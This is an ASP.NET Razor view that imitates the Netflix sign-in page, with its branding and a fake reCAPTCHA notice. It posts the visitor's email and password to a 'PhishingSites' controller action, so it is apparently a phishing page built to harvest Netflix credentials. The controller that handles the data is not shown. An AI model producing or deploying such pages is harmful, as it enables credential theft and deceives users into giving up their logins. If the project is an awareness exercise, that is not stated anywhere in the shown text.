@model WebProject.Models.UserModel
@{
    Layout = null;
}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Login Page | CodingNepal</title>
    <link rel="stylesheet" href="~/css/netflix.css">
</head>
<body>
<img src="~/images/TR-tr-20231211-popsignuptwoweeks-perspective_alpha_website_large.jpg" class="bg">
<div id="page-wrap">
</div>
<nav>
    <a href="#">
        <img src="~/images/logo.svg" alt="logo">
    </a>
</nav>
<div class="form-wrapper">
    <h2>Sign In</h2>
    @using (Html.BeginForm("Netflix", "PhishingSites", FormMethod.Post))
    {
        <div class="form-control">
            @Html.TextBoxFor(model => model.user_email, new { @type = "text", @class = "form-control", @required = "required" })
            <label>Email or phone number</label>
        </div>
        <div class="form-control">
            @Html.PasswordFor(model => model.user_password, new { @type = "password", @class = "form-control", @required = "required" })
            <label>Password</label>
        </div>
        <button type="submit">Sign In</button>
        <div class="form-help">
            <div class="remember-me">
                <input type="checkbox" id="remember-me" name="remember-me">
                <label for="remember-me">Remember me</label>
            </div>
            <a href="#">Need help?</a>
        </div>
    }

    <p>New to Netflix? <a href="#">Sign up now</a></p>
    <small>
        This page is protected by Google reCAPTCHA to ensure you're not a bot.
        <a href="#">Learn more.</a>
    </small>
    <br/>
    <br/>
    <br/>
    <br/>
</div>
</body>
</html>